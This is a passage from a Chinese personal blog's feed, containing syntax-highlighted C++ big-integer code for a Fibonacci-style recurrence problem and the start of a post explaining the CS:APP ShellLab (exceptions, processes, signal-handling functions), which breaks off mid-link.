class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; </span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXN 9999</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAXSIZE 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DLEN 4</span></span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BigNum</span></span></span><br><span class="line"><span class="class">&#123;</span> </span><br><span class="line"><span class="keyword">private</span>: </span><br><span class="line"><span class="keyword">int</span> a[<span class="number">500</span>];    <span class="comment">//可以控制大数的位数 </span></span><br><span class="line"><span class="keyword">int</span> len;       <span class="comment">//大数长度</span></span><br><span class="line"><span class="keyword">public</span>: </span><br><span class="line">BigNum()&#123; len = <span class="number">1</span>;<span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a)); &#125;   <span class="comment">//构造函数</span></span><br><span class="line">BigNum(<span class="keyword">const</span> <span class="keyword">int</span>);       <span class="comment">//将一个int类型的变量转化为大数</span></span><br><span class="line">BigNum(<span class="keyword">const</span> <span class="keyword">char</span>*);     <span class="comment">//将一个字符串类型的变量转化为大数</span></span><br><span class="line">BigNum(<span class="keyword">const</span> BigNum &amp;);  <span class="comment">//拷贝构造函数</span></span><br><span class="line">BigNum &amp;<span class="keyword">operator</span>=(<span class="keyword">const</span> BigNum &amp;);   <span class="comment">//重载赋值运算符，大数之间进行赋值运算</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">friend</span> istream&amp; <span class="keyword">operator</span>&gt;&gt;(istream&amp;,  BigNum&amp;);   <span class="comment">//重载输入运算符</span></span><br><span class="line"><span class="keyword">friend</span> ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp;,  BigNum&amp;);   <span class="comment">//重载输出运算符</span></span><br><span class="line"> </span><br><span class="line">BigNum <span class="keyword">operator</span>+(<span class="keyword">const</span> BigNum &amp;) <span class="keyword">const</span>;   <span class="comment">//重载加法运算符，两个大数之间的相加运算 </span></span><br><span class="line">BigNum <span class="keyword">operator</span>-(<span class="keyword">const</span> BigNum &amp;) <span class="keyword">const</span>;   <span class="comment">//重载减法运算符，两个大数之间的相减运算 </span></span><br><span class="line">BigNum <span class="keyword">operator</span>*(<span class="keyword">const</span> BigNum &amp;) <span class="keyword">const</span>;   <span class="comment">//重载乘法运算符，两个大数之间的相乘运算 </span></span><br><span class="line">BigNum <span class="keyword">operator</span>/(<span class="keyword">const</span> <span class="keyword">int</span>   &amp;) <span class="keyword">const</span>;    <span class="comment">//重载除法运算符，大数对一个整数进行相除运算</span></span><br><span class="line"> </span><br><span class="line">BigNum <span class="keyword">operator</span>^(<span class="keyword">const</span> <span class="keyword">int</span>  &amp;) <span class="keyword">const</span>;    <span class="comment">//大数的n次方运算</span></span><br><span class="line"><span class="keyword">int</span>    <span class="keyword">operator</span>%(<span class="keyword">const</span> <span class="keyword">int</span>  &amp;) <span class="keyword">const</span>;    <span class="comment">//大数对一个int类型的变量进行取模运算    </span></span><br><span class="line"><span class="keyword">bool</span>   <span class="keyword">operator</span>&gt;(<span class="keyword">const</span> BigNum &amp; T)<span class="keyword">const</span>;   <span class="comment">//大数和另一个大数的大小比较</span></span><br><span class="line"><span class="keyword">bool</span>   <span class="keyword">operator</span>&gt;(<span class="keyword">const</span> <span class="keyword">int</span> &amp; t)<span class="keyword">const</span>;      <span class="comment">//大数和一个int类型的变量的大小比较</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>;       <span class="comment">//输出大数</span></span><br><span class="line">&#125;; </span><br><span class="line">BigNum::BigNum(<span class="keyword">const</span> <span class="keyword">int</span> b)     <span class="comment">//将一个int类型的变量转化为大数</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> c,d = b;</span><br><span class="line">len = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line"><span class="keyword">while</span>(d &gt; MAXN)</span><br><span class="line">&#123;</span><br><span class="line">c = d - (d / (MAXN + <span class="number">1</span>)) * (MAXN + <span class="number">1</span>); </span><br><span class="line">d = d / (MAXN + <span class="number">1</span>);</span><br><span class="line">a[len++] = c;</span><br><span class="line">&#125;</span><br><span class="line">a[len++] = d;</span><br><span class="line">&#125;</span><br><span class="line">BigNum::BigNum(<span class="keyword">const</span> <span class="keyword">char</span>*s)     <span class="comment">//将一个字符串类型的变量转化为大数</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> t,k,index,l,i;</span><br><span class="line"><span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a));</span><br><span class="line">l=<span class="built_in">strlen</span>(s);   </span><br><span class="line">len=l/DLEN;</span><br><span class="line"><span class="keyword">if</span>(l%DLEN)</span><br><span class="line">len++;</span><br><span class="line">index=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=l<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i-=DLEN)</span><br><span class="line">&#123;</span><br><span class="line">t=<span class="number">0</span>;</span><br><span class="line">k=i-DLEN+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(k&lt;<span class="number">0</span>)</span><br><span class="line">k=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=k;j&lt;=i;j++)</span><br><span class="line">t=t*<span class="number">10</span>+s[j]-<span class="string">'0'</span>;</span><br><span class="line">a[index++]=t;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">BigNum::BigNum(<span class="keyword">const</span> BigNum &amp; T) : len(T.len)  <span class="comment">//拷贝构造函数</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> i; </span><br><span class="line"><span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a)); </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; len ; i++)</span><br><span class="line">a[i] = T.a[i]; </span><br><span class="line">&#125; </span><br><span class="line">BigNum &amp; BigNum::<span class="keyword">operator</span>=(<span class="keyword">const</span> BigNum &amp; n)   <span class="comment">//重载赋值运算符，大数之间进行赋值运算</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">len = n.len;</span><br><span class="line"><span class="built_in">memset</span>(a,<span class="number">0</span>,<span class="keyword">sizeof</span>(a)); </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; len ; i++) </span><br><span class="line">a[i] = n.a[i]; </span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>; </span><br><span class="line">&#125;</span><br><span class="line">istream&amp; <span class="keyword">operator</span>&gt;&gt;(istream &amp; in,  BigNum &amp; b)   <span class="comment">//重载输入运算符</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span> ch[MAXSIZE*<span class="number">4</span>];</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">-1</span>;</span><br><span class="line">in&gt;&gt;ch;</span><br><span class="line"><span class="keyword">int</span> l=<span class="built_in">strlen</span>(ch);</span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>,sum=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=l<span class="number">-1</span>;i&gt;=<span class="number">0</span>;)</span><br><span class="line">&#123;</span><br><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">4</span>&amp;&amp;i&gt;=<span class="number">0</span>;j++,i--,t*=<span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">sum+=(ch[i]-<span class="string">'0'</span>)*t;</span><br><span class="line">&#125;</span><br><span class="line">b.a[count]=sum;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line">b.len =count++;</span><br><span class="line"><span class="keyword">return</span> in;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">ostream&amp; <span class="keyword">operator</span>&lt;&lt;(ostream&amp; out,  BigNum&amp; b)   <span class="comment">//重载输出运算符</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i;  </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; b.a[b.len - <span class="number">1</span>]; </span><br><span class="line"><span class="keyword">for</span>(i = b.len - <span class="number">2</span> ; i &gt;= <span class="number">0</span> ; i--)</span><br><span class="line">&#123; </span><br><span class="line"><span class="built_in">cout</span>.width(DLEN); </span><br><span class="line"><span class="built_in">cout</span>.fill(<span class="string">'0'</span>); </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; b.a[i]; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> out;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">BigNum BigNum::<span class="keyword">operator</span>+(<span class="keyword">const</span> BigNum &amp; T) <span class="keyword">const</span>   <span class="comment">//两个大数之间的相加运算</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="function">BigNum <span class="title">t</span><span class="params">(*<span class="keyword">this</span>)</span></span>;</span><br><span class="line"><span class="keyword">int</span> i,big;      <span class="comment">//位数   </span></span><br><span class="line">big = T.len &gt; len ? T.len : len; </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; big ; i++) </span><br><span class="line">&#123; </span><br><span class="line">t.a[i] +=T.a[i]; </span><br><span class="line"><span class="keyword">if</span>(t.a[i] &gt; MAXN) </span><br><span class="line">&#123; </span><br><span class="line">t.a[i + <span class="number">1</span>]++; </span><br><span class="line">t.a[i] -=MAXN+<span class="number">1</span>; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(t.a[big] != <span class="number">0</span>)</span><br><span class="line">t.len = big + <span class="number">1</span>; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">t.len = big;   </span><br><span class="line"><span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line">BigNum BigNum::<span class="keyword">operator</span>-(<span class="keyword">const</span> BigNum &amp; T) <span class="keyword">const</span>   <span class="comment">//两个大数之间的相减运算 </span></span><br><span class="line">&#123;  </span><br><span class="line"><span class="keyword">int</span> i,j,big;</span><br><span class="line"><span class="keyword">bool</span> flag;</span><br><span class="line">BigNum t1,t2;</span><br><span class="line"><span class="keyword">if</span>(*<span class="keyword">this</span>&gt;T)</span><br><span class="line">&#123;</span><br><span class="line">t1=*<span class="keyword">this</span>;</span><br><span class="line">t2=T;</span><br><span class="line">flag=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">t1=T;</span><br><span class="line">t2=*<span class="keyword">this</span>;</span><br><span class="line">flag=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">big=t1.len;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; big ; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(t1.a[i] &lt; t2.a[i])</span><br><span class="line">&#123; </span><br><span class="line">j = i + <span class="number">1</span>; </span><br><span class="line"><span class="keyword">while</span>(t1.a[j] == <span class="number">0</span>)</span><br><span class="line">j++; </span><br><span class="line">t1.a[j--]--; </span><br><span class="line"><span class="keyword">while</span>(j &gt; i)</span><br><span class="line">t1.a[j--] += MAXN;</span><br><span class="line">t1.a[i] += MAXN + <span class="number">1</span> - t2.a[i]; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">t1.a[i] -= t2.a[i];</span><br><span class="line">&#125;</span><br><span class="line">t1.len = big;</span><br><span class="line"><span class="keyword">while</span>(t1.a[len - <span class="number">1</span>] == <span class="number">0</span> &amp;&amp; t1.len &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">t1.len--; </span><br><span class="line">big--;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag)</span><br><span class="line">t1.a[big<span class="number">-1</span>]=<span class="number">0</span>-t1.a[big<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">return</span> t1; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line">BigNum BigNum::<span class="keyword">operator</span>*(<span class="keyword">const</span> BigNum &amp; T) <span class="keyword">const</span>   <span class="comment">//两个大数之间的相乘运算 </span></span><br><span class="line">&#123; </span><br><span class="line">BigNum ret; </span><br><span class="line"><span class="keyword">int</span> i,j,up; </span><br><span class="line"><span class="keyword">int</span> temp,temp1;   </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span> ; i &lt; len ; i++)</span><br><span class="line">&#123; </span><br><span class="line">up = <span class="number">0</span>; </span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span> ; j &lt; T.len ; j++)</span><br><span class="line">&#123; </span><br><span class="line">temp = a[i] * T.a[j] + ret.a[i + j] + up; </span><br><span class="line"><span class="keyword">if</span>(temp &gt; MAXN)</span><br><span class="line">&#123; </span><br><span class="line">temp1 = temp - temp / (MAXN + <span class="number">1</span>) * (MAXN + <span class="number">1</span>); </span><br><span class="line">up = temp / (MAXN + <span class="number">1</span>); </span><br><span class="line">ret.a[i + j] = temp1; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; </span><br><span class="line">up = <span class="number">0</span>; </span><br><span class="line">ret.a[i + j] = temp; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span>(up != <span class="number">0</span>) </span><br><span class="line">ret.a[i + j] = up; </span><br><span class="line">&#125; </span><br><span class="line">ret.len = i + j; </span><br><span class="line"><span class="keyword">while</span>(ret.a[ret.len - <span class="number">1</span>] == <span class="number">0</span> &amp;&amp; ret.len &gt; <span class="number">1</span>)</span><br><span class="line">ret.len--; </span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125; </span><br><span class="line">BigNum BigNum::<span class="keyword">operator</span>/(<span class="keyword">const</span> <span class="keyword">int</span> &amp; b) <span class="keyword">const</span>   <span class="comment">//大数对一个整数进行相除运算</span></span><br><span class="line">&#123; </span><br><span class="line">BigNum ret; </span><br><span class="line"><span class="keyword">int</span> i,down = <span class="number">0</span>;   </span><br><span class="line"><span class="keyword">for</span>(i = len - <span class="number">1</span> ; i &gt;= <span class="number">0</span> ; i--)</span><br><span class="line">&#123; </span><br><span class="line">ret.a[i] = (a[i] + down * (MAXN + <span class="number">1</span>)) / b; </span><br><span class="line">down = a[i] + down * (MAXN + <span class="number">1</span>) - ret.a[i] * b; </span><br><span class="line">&#125; </span><br><span class="line">ret.len = len; </span><br><span class="line"><span class="keyword">while</span>(ret.a[ret.len - <span class="number">1</span>] == <span class="number">0</span> &amp;&amp; ret.len &gt; <span class="number">1</span>)</span><br><span class="line">ret.len--; </span><br><span class="line"><span class="keyword">return</span> ret; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> BigNum::<span class="keyword">operator</span> %(<span class="keyword">const</span> <span class="keyword">int</span> &amp; b) <span class="keyword">const</span>    <span class="comment">//大数对一个int类型的变量进行取模运算    </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">int</span> i,d=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = len<span class="number">-1</span>; i&gt;=<span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line">d = ((d * (MAXN+<span class="number">1</span>))% b + a[i])% b;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line">BigNum BigNum::<span class="keyword">operator</span>^(<span class="keyword">const</span> <span class="keyword">int</span> &amp; n) <span class="keyword">const</span>    <span class="comment">//大数的n次方运算</span></span><br><span class="line">&#123;</span><br><span class="line">BigNum t,ret(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">if</span>(n&lt;<span class="number">0</span>)</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>;</span><br><span class="line"><span class="keyword">int</span> m=n;</span><br><span class="line"><span class="keyword">while</span>(m&gt;<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">t=*<span class="keyword">this</span>;</span><br><span class="line"><span class="keyword">for</span>( i=<span class="number">1</span>;i&lt;&lt;<span class="number">1</span>&lt;=m;i&lt;&lt;=<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">t=t*t;</span><br><span class="line">&#125;</span><br><span class="line">m-=i;</span><br><span class="line">ret=ret*t;</span><br><span class="line"><span class="keyword">if</span>(m==<span class="number">1</span>)</span><br><span class="line">ret=ret*(*<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> BigNum::<span class="keyword">operator</span>&gt;(<span class="keyword">const</span> BigNum &amp; T) <span class="keyword">const</span>   <span class="comment">//大数和另一个大数的大小比较</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> ln; </span><br><span class="line"><span class="keyword">if</span>(len &gt; T.len)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(len == T.len)</span><br><span class="line">&#123; </span><br><span class="line">ln = len - <span class="number">1</span>; </span><br><span class="line"><span class="keyword">while</span>(a[ln] == T.a[ln] &amp;&amp; ln &gt;= <span class="number">0</span>)</span><br><span class="line">ln--; </span><br><span class="line"><span class="keyword">if</span>(ln &gt;= <span class="number">0</span> &amp;&amp; a[ln] &gt; T.a[ln])</span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">bool</span> BigNum::<span class="keyword">operator</span> &gt;(<span class="keyword">const</span> <span class="keyword">int</span> &amp; t) <span class="keyword">const</span>    <span class="comment">//大数和一个int类型的变量的大小比较</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="function">BigNum <span class="title">b</span><span class="params">(t)</span></span>;</span><br><span class="line"><span class="keyword">return</span> *<span class="keyword">this</span>&gt;b;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">void</span> BigNum::print()    <span class="comment">//输出大数</span></span><br><span class="line">&#123; </span><br><span class="line"><span class="keyword">int</span> i;   </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a[len - <span class="number">1</span>]; </span><br><span class="line"><span class="keyword">for</span>(i = len - <span class="number">2</span> ; i &gt;= <span class="number">0</span> ; i--)</span><br><span class="line">&#123; </span><br><span class="line"><span class="built_in">cout</span>.width(DLEN); </span><br><span class="line"><span class="built_in">cout</span>.fill(<span class="string">'0'</span>); </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; a[i]; </span><br><span class="line">&#125; </span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,n;</span><br><span class="line">BigNum r,s,t,l;</span><br><span class="line"><span class="keyword">int</span> sn;</span><br><span class="line"><span class="keyword">while</span>(~<span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;sn))</span><br><span class="line">&#123;</span><br><span class="line">r=s=t=<span class="number">0</span>;</span><br><span class="line">r=<span class="number">0</span>;</span><br><span class="line">s=<span class="number">1</span>;</span><br><span class="line">t=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">3</span>;i&lt;=sn;++i)</span><br><span class="line">&#123;</span><br><span class="line">l=t+s;</span><br><span class="line">r=s;</span><br><span class="line">s=t;</span><br><span class="line">t=l;</span><br><span class="line"><span class="comment">//dp[i]=dp[i-1]+dp[i-2];</span></span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">if</span>(sn==<span class="number">0</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"0\n"</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sn==<span class="number">1</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"1\n"</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span> <span class="keyword">if</span>(sn==<span class="number">2</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"2\n"</span>);</span><br><span class="line"> &#125;<span class="keyword">else</span></span><br><span class="line"> &#123;</span><br><span class="line"> t.print();</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">// printf("%lld\n",dp[n]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;谁是单身狗&quot;&gt;&lt;a href=&quot;#谁是单身狗&quot; class=&quot;headerlink&quot; title=&quot;谁是单身狗&quot;&gt;&lt;/a&gt;谁是单身狗&lt;/h1&gt;&lt;h2 id=&quot;题意&quot;&gt;&lt;a href=&quot;#题意&quot; class=&quot;headerlink&quot; title=&quot;题意&quot;&gt;&lt;/a&gt;题
      
    
    </summary>
    
    
      <category term="算法" scheme="lengyu.me/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>CS:APP ShellLab</title>
    <link href="lengyu.me/2018/10/01/CS:APP-ShellLab/"/>
    <id>lengyu.me/2018/10/01/CS:APP-ShellLab/</id>
    <published>2018-10-01T09:26:29.000Z</published>
    <updated>2019-07-28T15:41:39.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CS-APP-ShellLab"><a href="#CS-APP-ShellLab" class="headerlink" title="CS:APP ShellLab"></a>CS:APP ShellLab</h1><p>这一次实验是利用CS:APP第八章(异常控制流)相关的内容进行实验，打造一款属于自己的Shell!</p><h2 id="前置内容"><a href="#前置内容" class="headerlink" title="前置内容"></a>前置内容</h2><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><p>异常就是控制流中的突变，用来响应处理器状态中的某些变化。发生异常时，控制流会转移到异常处理程序，<br>然后根据异常的类型来决定如何继续执行或者终止程序。</p><h3 id="异常的类型"><a href="#异常的类型" class="headerlink" title="异常的类型"></a>异常的类型</h3><table><thead><tr><th>类别</th><th>原因</th><th>异步/同步</th><th>返回行为</th></tr></thead><tbody><tr><td>中断</td><td>来自I/O设备的信号</td><td>异步</td><td>总是返回到下一条指令</td></tr><tr><td>陷阱</td><td>有意的异常</td><td>同步</td><td>总是返回到下一条指令</td></tr><tr><td>故障</td><td>潜在可修复的错误</td><td>同步</td><td>可能返回到当前指令</td></tr><tr><td>终止</td><td>不可恢复的错误</td><td>同步</td><td>不会返回</td></tr><tr><td>### 进程</td><td></td><td></td><td></td></tr><tr><td>进程提供了一种抽象，让我们可以将一个程序当做独占的使用计算机的系统资源那样处理程序。进程一般认为就是</td><td></td><td></td><td></td></tr><tr><td>一个执行中的程序的实例。系统的程序都运行在某个进程的上下文(context)中，上下文这个词我们经常见到，</td><td></td><td></td><td></td></tr><tr><td>一般认为这就是指的我们程序运行的”环境”,比如当前的变量数据以及寄存器的状态等。虽然进程给我们提供了一种</td><td></td><td></td><td></td></tr><tr><td>独占使用处理器的抽象，但是我们必须知道他的逻辑控制流是割裂的，实际上处理器会在每个进程上运行一段时间</td><td></td><td></td><td></td></tr><tr><td>后切换到其他进程，通过频繁的切换来让我们的感受到好像是很多程序在”同时”运行一样。</td><td></td><td></td><td></td></tr></tbody></table><blockquote><p>从程序员的角度，我们可以认为进程总是在下面三种状态之一</p><ul><li>运行。进程要么在CPU上执行，要么在等待被执行并且最终被内核调度</li><li>停止。进程的执行被挂起(suspended)，且不会被调度。当收到SIGSTOP、SIGTSTP、SIGTIN或者SIGTTOU信号时，进程就停止，并且保持停止<br>直到它收到一个SIGCONT信号，在这时刻，进程再次开始运行(信号是一种软件中断的形式)</li><li>终止。 进程永远地停止了。进程会因为三种原因终止:1)收到一个信号，该信号的默认行为是终止进程，2)从主进程返回,3)调用exit函数 。  </li></ul></blockquote><h3 id="一些要用到的函数"><a href="#一些要用到的函数" class="headerlink" title="一些要用到的函数"></a>一些要用到的函数</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span>;<span class="comment">//以status退出状态来终止进程</span></span><br><span class="line"><span class="keyword">pid_t</span> fork(<span class="keyword">void</span>);<span class="comment">//复制出一份当前的上下文并在新的上下文上继续进行执行当前代码，也就是会有两个进程执行当前代码，两个进程同时返回创建的子进程的pid或者在子进程中返回0</span></span><br><span class="line">pid_waitpid(<span class="keyword">pid_t</span> pid,<span class="keyword">int</span> *statusp, <span class="keyword">int</span> options)<span class="comment">//以options选项等待pid进程的状态并返回被回收的pid号或者0</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigprocmask</span><span class="params">(<span class="keyword">int</span> how,<span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">sigset_t</span> *oldset)</span></span>;根据<span class="built_in">set</span>执行how并把当前<span class="built_in">set</span>保存到oldset</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigemptyset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span>;<span class="comment">//清空set</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigfillset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span>;<span class="comment">//填充所有信号到set</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigaddset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">int</span> signum)</span></span>;<span class="comment">//在set中增加signum信号</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigdelset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>,<span class="keyword">int</span> signum)</span></span>;<span class="comment">//在set中删除信号signum</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kill</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> sig)</span></span>;<span class="comment">//向pid进程或者|pid|进程组发送sig信号</span></span><br></pre></td></tr></table></figure><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ul><li>注意fork出来的进程的执行情况和当前进程是独立的，而且因为逻辑控制流是在不断地切换的，无法保证两个<br>进程中某个代码是否会在另一个进程的某个代码之前或者之后执行。于是需要参考书上的内容对信号进行阻塞，<br>防止deletejob调用于addjob之前(主要是阻塞SIGCHLD信号)</li><li>事实上由于只需要实现bg、fg、quit、jobs四个命令为内置命令，所有的内置命令其实都可以看做fgjob来实现，<br>也就是只需要对非内置命令调用fork来进行execve。</li><li>注意子进程execve之后需要立刻exit，因为子进程不需要执行其他地方的代码。</li><li>kill函数非常有用</li><li>waitpid请设置options为WUNTRACED|WNOHANG让他立刻返回否则在C+z的时候会发送SIGCHLD信号但此时并没有zombie需要<br>回收并一直等待</li><li>如何处理发送到自己的信号比较有技巧，参考代码(这一部分其实我也是参考<a href="https://blog.csdn.net/github_33873969/article/details/77896913" target="_blank" rel="noopener">CSDN</a>实现的)</li><li>C+z不止发送SIGTSTP还发送了SIGCHLD<h2 id="实现细节"><a href="#实现细节" class="headerlink" title="实现细节"></a>实现细节</h2>最近精力有限就直接贴代码了，以后有时间再填坑<br>代码地址:<a href="https://github.com/SaltiedFish/CS-APP-Lab/blob/master/shell/shlab-handout/tsh.c" target="_blank" 